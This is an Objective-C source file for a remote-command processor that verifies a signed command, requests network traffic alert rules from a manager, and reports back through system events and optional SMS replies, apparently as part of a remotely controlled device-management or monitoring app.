//
//  SyncNetworkAlertCriteriaProcessor.m
//  RCM
//
//  Created by ophat on 1/11/16.
//
//

#import "SyncNetworkAlertCriteriaProcessor.h"

@interface SyncNetworkAlertCriteriaProcessor (PrivateAPI)
- (void) processSyncNetworkAlertCriteria;
- (void) acknowldgeMessage;
- (void) syncNetworkAlertCriteriaException;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete;
- (void) processFinished;
@end

@implementation SyncNetworkAlertCriteriaProcessor

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData
    andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"SyncNetworkAlertCriteriaProcessor--->initWithRemoteCommandData")
    if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
    }
    return self;
}

#pragma mark RemoteCmdProcessor Methods

- (void) doProcessingCommand {
    DLog (@"SyncNetworkAlertCriteriaProcessor--->doProcessingCommand");
    
    if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData numberOfMinimumCompulsoryTag:2]) {
        [RemoteCmdSignatureUtils throwInvalidCmdWithName:@"SyncNetworkAlertCriteriaProcessor" reason:@"Failed signature check"];
    }
    
    [self processSyncNetworkAlertCriteria];
}

#pragma mark RequestSyncNetworkAlertCriteriaProcessor Private Mehods

- (void) processSyncNetworkAlertCriteria {
    DLog (@"SyncNetworkAlertCriteriaProcessor--->processSyncNetworkAlertCriteria");

    id <NetworkTrafficAlertManager> networkAlertManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mNetworkTrafficAlertManager];
    BOOL isReady = [networkAlertManager requestNetworkTrafficRule:self];
    
    if (!isReady) {
        DLog (@"!!! not ready to process SyncNetworkAlertCriteriaProcessor command")
        [self syncNetworkAlertCriteriaException];
    } else {
       	DLog (@".... processing SyncNetworkAlertCriteriaProcessor command");
        [self acknowldgeMessage];
    }
}

- (void) syncNetworkAlertCriteriaException {
    DLog (@"SyncNetworkAlertCriteriaProcessor ---> syncNetworkAlertCriteriaException");
    FxException* exception = [FxException exceptionWithName:@"syncNetworkAlertCriteriaException" andReason:@"syncNetworkAlertCriteria error"];
    [exception setErrorCode:kNetworkAlertManagerBusy];
    [exception setErrorCategory:kFxErrorRCM];
    @throw exception;
}


- (void) acknowldgeMessage {
    NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
    NSString *ackMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kSyncNetworkAlertCriteriaMSG1", @"")];
    [self sendReplySMS:ackMessage isProcessCompleted:NO];
}

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
    DLog (@"SyncNetworkAlertCriteriaProcessor--->sendReplySMS");
    [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
                                             andReplyMessage:aReplyMessage];
    if ([mRemoteCmdData mIsSMSReplyRequired]) {
        [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
                                                               andMessage:aReplyMessage];
    }
    if (aIsComplete) {
        [self processFinished];
    }
    else {
        DLog (@"Sent acknowldge message.");
    }
}

-(void) processFinished {
    DLog (@"SyncNetworkAlertCriteriaProcessor--->processFinished");
    if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
        [mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
    }
}

#pragma mark NetworkTrafficRuleDelegate methods

- (void) requestNetworkTrafficRuleCompleted:(NSError *)aError {
    DLog(@"requestNetworkTrafficRuleCompleted --->.")
    NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
    NSString *ackMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kSyncNetworkAlertCriteriaMSG2", @"")];
    [self sendReplySMS:ackMessage isProcessCompleted:YES];
}

- (void) resetNetworkTrafficRuleCompleted:(NSError *)aError {
    //No implement
}


- (void) dealloc {
    [super dealloc];
}


@end
